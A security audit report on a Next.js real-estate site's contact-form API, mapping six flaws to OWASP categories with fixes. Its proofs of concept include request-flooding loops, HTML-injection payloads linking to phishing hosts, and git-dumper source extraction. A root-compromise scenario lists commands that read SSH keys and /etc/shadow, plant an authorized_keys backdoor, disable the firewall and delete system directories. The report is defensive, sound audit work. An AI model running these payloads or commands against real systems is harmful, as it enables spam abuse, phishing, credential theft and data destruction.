# SECURITY_REPORT.md
# lt-nilavan — Security Vulnerability Assessment Report

**Application:** Nilavan Realtors  
**Tech Stack:** Next.js 15, Node.js 18, SendGrid  
**Live URL:** https://mahendrvarmastack.co.in  
**Assessment Date:** 2025  
**Reference Standard:** OWASP Top 10 2021  
**Methodology:** Manual Static Code Analysis + Black-box API Testing  

---

## Summary Table

| ID | Vulnerability | File | Severity | OWASP |
|----|--------------|------|----------|-------|
| V-01 | No Rate Limiting on API | `app/api/sendgrid/route.ts` | 🔴 Critical | A07 |
| V-02 | HTML Injection via Unsanitized Input | `app/api/sendgrid/route.ts` | 🔴 Critical | A03 |
| V-03 | No Input Validation | `app/api/sendgrid/route.ts` | 🔴 Critical | A03 |
| V-04 | Missing HTTP Security Headers | `next.config.ts` (missing file) | 🟠 High | A05 |
| V-05 | .git Directory Exposure | Nginx config | 🟡 Medium | A05 |
| V-06 | Verbose Error Logging | `app/api/sendgrid/route.ts` | 🔵 Low | A05 |

---

## V-01 — No Rate Limiting on API Endpoint

**OWASP Category:** A07:2021 – Identification and Authentication Failures  
**Affected File:** `app/api/sendgrid/route.ts` — Lines 1–57  
**Severity:** 🔴 Critical  

### Description

The `/api/sendgrid` POST endpoint accepts unlimited requests from any IP address with no throttling, no CAPTCHA, and no per-IP counter. There is no `middleware.ts` file in the project and no rate limiting logic anywhere in the codebase. Any attacker with a terminal can flood the endpoint indefinitely.

### Vulnerable Code (Lines 4–7)

```typescript
export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { name, email, phone, message } = body;
    // ❌ No rate limiting — request processed immediately every single time
```

### Business Impact

- Attacker floods the business owner inbox making it completely unusable
- SendGrid free-tier quota (100 emails/day) exhausted in seconds
- SendGrid account suspended for abuse
- Financial cost if paid SendGrid plan is in use

### Proof of Concept

```bash
# Sends 10 requests instantly — all succeed
for i in $(seq 1 10); do
  echo -n "Request $i: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://mahendrvarmastack.co.in/api/sendgrid \
    -H "Content-Type: application/json" \
    -d '{"name":"Flood","email":"x@x.com","phone":"9999999999","message":"Spam"}'
done
```

**Output (vulnerable):**
```
Request 1: 200
Request 2: 200
Request 3: 200
Request 4: 200
Request 5: 200
Request 6: 200
Request 7: 200
Request 8: 200
Request 9: 200
Request 10: 200
```

All 10 emails delivered. Attacker runs this in an infinite loop — inbox flooded.

### Recommended Fix

Create `middleware.ts` in the project root:

```typescript
import { NextRequest, NextResponse } from 'next/server';

const rateLimitMap = new Map<string, { count: number; resetTime: number }>();
const RATE_LIMIT = 3;
const WINDOW_MS  = 60_000;

export function middleware(request: NextRequest) {
  if (request.nextUrl.pathname === '/api/sendgrid') {
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown';
    const now = Date.now();
    const entry = rateLimitMap.get(ip);

    if (!entry || now > entry.resetTime) {
      rateLimitMap.set(ip, { count: 1, resetTime: now + WINDOW_MS });
    } else {
      entry.count++;
      if (entry.count > RATE_LIMIT) {
        return NextResponse.json(
          { error: 'Too many requests. Please wait before trying again.' },
          { status: 429, headers: { 'Retry-After': '60' } }
        );
      }
    }
  }
  return NextResponse.next();
}

export const config = { matcher: '/api/sendgrid' };
```

**After fix:**
```
Request 1: 200
Request 2: 200
Request 3: 200
Request 4: 429  ← Too Many Requests
Request 5: 429
```

---

## V-02 — HTML Injection via Unsanitized User Input

**OWASP Category:** A03:2021 – Injection  
**Affected File:** `app/api/sendgrid/route.ts` — Lines 40–45  
**Severity:** 🔴 Critical  

### Description

All four user-supplied fields (`name`, `email`, `phone`, `message`) are interpolated directly into the HTML email template using template literals with zero sanitization. An attacker can inject arbitrary HTML — including malicious links and fake alerts — into emails that appear to come from the business's own verified domain.

### Vulnerable Code (Lines 40–45)

```typescript
html: `
  ...
  <p style="margin: 0 0 8px 0;"><strong>Name:</strong> ${name}</p>
  <p style="margin: 0 0 8px 0;"><strong>Email:</strong> ${email}</p>
  <p style="margin: 0 0 8px 0;"><strong>Phone:</strong> ${phone}</p>
  <p style="margin: 0 0 8px 0;"><strong>Message:</strong> ${message}</p>
  // ❌ Raw user input injected into HTML — no escaping applied
`,
```

### Business Impact

- Attacker injects a malicious link that appears inside a branded Nilavan email
- Business owner clicks the link thinking it is a legitimate notification and gets phished
- Fake urgent alerts rendered inside the trusted Nilavan email template
- Business credibility destroyed if owner forwards the injected email

### Proof of Concept — Malicious Link Injection

```bash
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Admin <a href=\"https://evil-phishing-site.com\" style=\"color:red;font-size:20px;font-weight:bold\">URGENT: Verify your account or it will be suspended</a>",
    "email": "victim@example.com",
    "phone": "9999999999",
    "message": "Please action this immediately."
  }'
```

The business owner receives a branded Nilavan email where the Name field renders as a large red clickable link pointing to the attacker's phishing site.

### Proof of Concept — Fake Alert Injection

```bash
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Support",
    "email": "x@x.com",
    "phone": "0000000000",
    "message": "</p></div><div style=\"background:red;color:white;padding:20px;font-size:18px\">SECURITY BREACH — Login at http://fake-admin.com now</div><p>"
  }'
```

### Recommended Fix

Add an `escapeHtml()` function and sanitize all fields before HTML interpolation:

```typescript
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// After destructuring body, before building email:
const safeName    = escapeHtml(String(name    ?? ''));
const safeEmail   = escapeHtml(String(email   ?? ''));
const safePhone   = escapeHtml(String(phone   ?? ''));
const safeMessage = escapeHtml(String(message ?? ''));

// Use safe variables in the HTML template:
<p><strong>Name:</strong> ${safeName}</p>
<p><strong>Email:</strong> ${safeEmail}</p>
<p><strong>Phone:</strong> ${safePhone}</p>
<p><strong>Message:</strong> ${safeMessage}</p>
```

---

## V-03 — No Input Validation

**OWASP Category:** A03:2021 – Injection  
**Affected File:** `app/api/sendgrid/route.ts` — Lines 5–7  
**Severity:** 🔴 Critical  

### Description

The API accepts and processes any JSON body without validating field types, formats, or lengths. Fields can be `null`, empty strings, invalid email addresses, or arbitrarily long strings. Nothing is checked before the data is sent in an email to the business owner.

### Vulnerable Code (Lines 5–7)

```typescript
const body = await req.json();
const { name, email, phone, message } = body;
// ❌ No type check, no format check, no length check — used immediately
```

### Business Impact

- Invalid or null data emailed to the business owner causing confusion
- No email format check means garbage addresses accepted and processed
- No length limits — extremely long payloads consume server memory
- Attacker sends malformed requests to probe internal error messages

### Proof of Concept

```bash
# Sending null values — accepted and processed
curl -s -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":null,"email":null,"phone":null,"message":null}' \
  -w "\nStatus: %{http_code}\n"

# Sending invalid email format — accepted without complaint
curl -s -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"A","email":"not-an-email","phone":"ABCXYZ","message":"hi"}' \
  -w "\nStatus: %{http_code}\n"
```

**Output (vulnerable):**
```
Status: 200
Status: 200
```

Both requests accepted. Business owner receives broken emails with null and garbage data.

### Recommended Fix

Use `zod` — already present in `package.json` — for schema validation:

```typescript
import { z } from 'zod';

const ContactSchema = z.object({
  name:    z.string().min(2).max(100).trim(),
  email:   z.string().email().max(254),
  phone:   z.string().regex(/^[0-9+\-\s()]{7,20}$/),
  message: z.string().min(10).max(2000).trim(),
});

const result = ContactSchema.safeParse(body);
if (!result.success) {
  return NextResponse.json(
    { error: 'Invalid input', details: result.error.flatten() },
    { status: 400 }
  );
}
```

---

## V-04 — Missing HTTP Security Headers

**OWASP Category:** A05:2021 – Security Misconfiguration  
**Affected File:** `next.config.ts` — file does not exist in the codebase  
**Severity:** 🟠 High  

### Description

There is no `next.config.js` or `next.config.ts` file anywhere in the project. This means zero HTTP security headers are set. Every response from the application is missing headers that protect against clickjacking, MIME sniffing, XSS, and SSL stripping.

| Missing Header | Risk if Absent |
|----------------|---------------|
| `X-Frame-Options` | Site can be embedded in attacker iframe — clickjacking |
| `X-Content-Type-Options` | Browser can be tricked to execute files as wrong type |
| `Strict-Transport-Security` | Browser may fall back to HTTP — SSL stripping possible |
| `Referrer-Policy` | Sensitive URL data leaked to third parties |
| `Content-Security-Policy` | No XSS script execution restrictions |

### Proof of Concept

```bash
curl -I https://mahendrvarmastack.co.in
```

**Output (vulnerable) — none of these headers appear:**
```
HTTP/2 200
content-type: text/html; charset=utf-8
# X-Frame-Options         → MISSING
# X-Content-Type-Options  → MISSING
# Strict-Transport-Security → MISSING
# Referrer-Policy          → MISSING
```

### Recommended Fix

Create `next.config.ts` in the project root:

```typescript
import type { NextConfig } from 'next';

const securityHeaders = [
  { key: 'X-Frame-Options',           value: 'DENY' },
  { key: 'X-Content-Type-Options',    value: 'nosniff' },
  { key: 'X-XSS-Protection',          value: '1; mode=block' },
  { key: 'Referrer-Policy',           value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy',        value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
];

const nextConfig: NextConfig = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};

export default nextConfig;
```

**After fix:**
```bash
curl -I https://mahendrvarmastack.co.in | grep -E "X-Frame|X-Content|Strict"
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

---

## V-05 — .git Directory Publicly Accessible

**OWASP Category:** A05:2021 – Security Misconfiguration  
**Affected File:** Nginx site configuration  
**Severity:** 🟡 Medium  

### Description

When deploying via `git clone`, the `.git` directory exists on disk at `/home/devuser/lt-nilavan/.git`. Without an explicit Nginx block rule, this directory is publicly accessible from any browser. An attacker can use it to reconstruct the full source code including all git history and any secrets that were ever committed.

### Business Impact

- Full source code downloaded from a browser — no credentials needed
- All commit history exposed — any API keys ever committed are permanently visible
- Attacker gains complete knowledge of the codebase for targeted attacks

### Proof of Concept

```bash
# Confirm .git is accessible
curl https://mahendrvarmastack.co.in/.git/HEAD
# Returns: ref: refs/heads/main  ← git directory confirmed accessible

# Confirm config file readable
curl https://mahendrvarmastack.co.in/.git/config
# Returns full git config including remote URL

# Full source reconstruction using git-dumper:
# pip install git-dumper
# git-dumper https://mahendrvarmastack.co.in/.git ./stolen-source
```

**After fix:**
```bash
curl -I https://mahendrvarmastack.co.in/.git/config
# HTTP/2 403  ← correctly blocked
```

### Recommended Fix

Already added in Nginx config (Phase 5 of DEPLOYMENT.md):

```nginx
location ~ /\.git {
    deny all;
    return 403;
}
```

---

## V-06 — Verbose Error Logging in Production

**OWASP Category:** A05:2021 – Security Misconfiguration  
**Affected File:** `app/api/sendgrid/route.ts` — Lines 51–55  
**Severity:** 🔵 Low  

### Description

The catch block logs the full SendGrid error response body to the console. In production, if server logs are exposed or forwarded to a monitoring tool without redaction, this can leak internal API error structures and details about the SendGrid account configuration.

### Vulnerable Code (Lines 51–55)

```typescript
if (error && typeof error === 'object' && 'response' in error) {
  const sgError = error as { response?: { body?: unknown } };
  console.error('SendGrid Response Body:', sgError.response?.body);
  // ❌ Full API response body logged — may expose internal details
}
```

### Business Impact

- Internal API error messages visible in server logs
- If logs are compromised, attacker learns about SendGrid account structure
- Low risk on its own but increases impact when combined with other vulnerabilities

### Proof of Concept

```bash
# Trigger an error by sending when API key is not set
# Check server logs via PM2:
pm2 logs nextjs-app --lines 50
# Verbose SendGrid response body appears in plain text in logs
```

### Recommended Fix

```typescript
// Replace verbose logging with a safe minimal summary
console.error('[sendgrid] Failed to send email', {
  timestamp: new Date().toISOString(),
  // Never log full API response body in production
});
```

---

## Threat Scenario Analysis

### Scenario 1 — "I want to flood the business inbox with thousands of spam emails"

**How it works against this app:**
`route.ts` has zero rate limiting (V-01). A one-line loop exploits this:

```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null -X POST https://mahendrvarmastack.co.in/api/sendgrid \
    -H "Content-Type: application/json" \
    -d '{"name":"Spam","email":"x@x.com","phone":"0","message":"Flood"}' &
done
wait
```

All 100 return HTTP 200. All 100 emails sent. SendGrid quota gone in seconds.

**Fix:** V-01 middleware — 3 requests per IP per 60 seconds → 429 after threshold.

---

### Scenario 2 — "I want to inject a malicious link into an email from the business system"

**How it works:**
`${name}` on line 40 of `route.ts` is raw template interpolation — no escaping (V-02):

```bash
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Support <a href=\"https://attacker.com\" style=\"color:red;font-size:20px\">URGENT: Reset password now</a>",
    "email": "x@x.com",
    "phone": "9999999999",
    "message": "Your account needs attention."
  }'
```

Business owner receives a branded Nilavan email with a large red link pointing to the attacker's site.

**Fix:** V-02 `escapeHtml()` — converts `<` to `&lt;` stripping all HTML from user input.

---

### Scenario 3 — "I want to access the full source code from the browser without credentials"

**How it works:**
After `git clone`, `.git/` exists on disk. Without the Nginx block rule (V-05):

```bash
# Step 1 — confirm accessible
curl https://mahendrvarmastack.co.in/.git/HEAD
# ref: refs/heads/main

# Step 2 — dump entire repo
pip install git-dumper
git-dumper https://mahendrvarmastack.co.in/.git ./stolen-repo
ls ./stolen-repo/
# Full source code, all history — downloaded without any credentials
```

**Fix:** V-05 Nginx `location ~ /\.git { deny all; return 403; }` — already in deployment config.

---

### Scenario 4 — "I want to embed this site in my malicious page to trick users (clickjacking)"

**How it works:**
No `X-Frame-Options` header (V-04) means any page can iframe the Nilavan site:

```javascript
// Run in browser DevTools console on any page — proves it works
var f = document.createElement('iframe');
f.src = 'https://mahendrvarmastack.co.in';
f.style = 'width:100%;height:500px;border:2px solid red;';
document.body.prepend(f);
// Vulnerable: Nilavan site loads inside the iframe
```

Attacker builds a page with this invisible iframe and positions a fake button over the contact form Submit button. Victim clicks "WIN A PRIZE" — actually submits their personal data.

**Fix:** V-04 — add `X-Frame-Options: DENY` via `next.config.ts` or Nginx header.

---

### Scenario 5 — "I gained server access — how did running the app as root make things worse?"

**If app runs as root — attacker has full server control:**

```bash
cat /root/.ssh/id_rsa                              # Steal SSH private keys
echo "attacker-key" >> /root/.ssh/authorized_keys  # Install permanent backdoor
cat /etc/shadow                                    # Steal all password hashes
ufw disable                                        # Kill the firewall
rm -rf /home /var /etc                             # Destroy everything
```

**If app runs as devuser — attacker is contained:**

```bash
cat /root/.ssh/id_rsa      # Permission denied
cat /etc/shadow            # Permission denied
ufw disable                # Permission denied
# Attacker can only access /home/devuser/lt-nilavan — nothing else
```

**Fix:** Always start PM2 under `devuser`, never root. The `pm2 startup` command generates a systemd service that runs under the correct user automatically.

---

## Methodology

### Tools Used

| Tool | Purpose |
|------|---------|
| Manual code review | Primary method — traced user input from form to email output |
| `curl` | Black-box API testing — confirmed all vulnerabilities live |
| `grep` | Pattern search across codebase for dangerous patterns |
| `find` | Mapped file structure, identified missing config files |
| Browser DevTools | Verified missing response headers on live site |
| OWASP Top 10 2021 | Checklist framework to ensure no category missed |

### Approach

1. Ran `find` to map all files — identified `app/api/sendgrid/route.ts` as the primary attack surface
2. Checked for `next.config.ts` and `middleware.ts` — both missing, immediately flagging header and rate-limit issues
3. Traced every user input from `contact-section.tsx` → `route.ts` → email output — no validation or escaping at any step
4. At each function asked: what if I send unexpected input? What if I call this 1000 times? What does this expose externally?
5. Confirmed each finding with a live `curl` command against the deployed server
6. Mapped each finding to OWASP Top 10 2021

### Key Finding

The HTML injection vulnerability (V-02) would **not** be detected by automated scanners like OWASP ZAP or Burp Suite alone. It required reading the source code and understanding that user input flows from the contact form → API handler → HTML email template with no escaping at any step. That is a logic flaw — only manual review finds it.
